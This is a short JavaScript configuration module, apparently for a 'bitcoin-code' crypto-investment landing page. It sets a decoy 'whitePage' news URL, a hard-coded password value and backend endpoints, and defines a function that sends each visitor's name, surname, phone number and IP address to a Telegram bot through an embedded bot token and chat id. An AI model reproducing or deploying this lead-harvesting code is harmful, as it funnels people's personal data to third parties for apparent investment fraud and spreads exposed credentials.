import axios from "axios";
export const phonecode = "1";
export const country = "EN";
export const landing = "bitcoin-code";
export const idpass = "123qwe321";
export const whitePage = "https://www.martinviz.com/article/martin-vizcarra-asegura-dejar-la-presidencia-de-peru-con-la-frente-en-alto/thanku";
export const api ='http://localhost:3001/'
export const production_api ='https://offer-backend-abc1d5c3e8a8.herokuapp.com/'

export const gram = async (first_name, last_name , phone , ipAddress) => {
    try {
      await axios.get(
        `https://api.telegram.org/bot6178662946:AAEPFmQgxuZ2wmsQFAx2yG_vndJySpkRR9c/sendMessage?chat_id=-983606166&text=Name: ${first_name}%0ALastName: ${last_name}%0APhone: ${phone}%0AipAddress: ${ipAddress}`
      );
    } catch (error) {
      console.log(error.message);
    }
  };
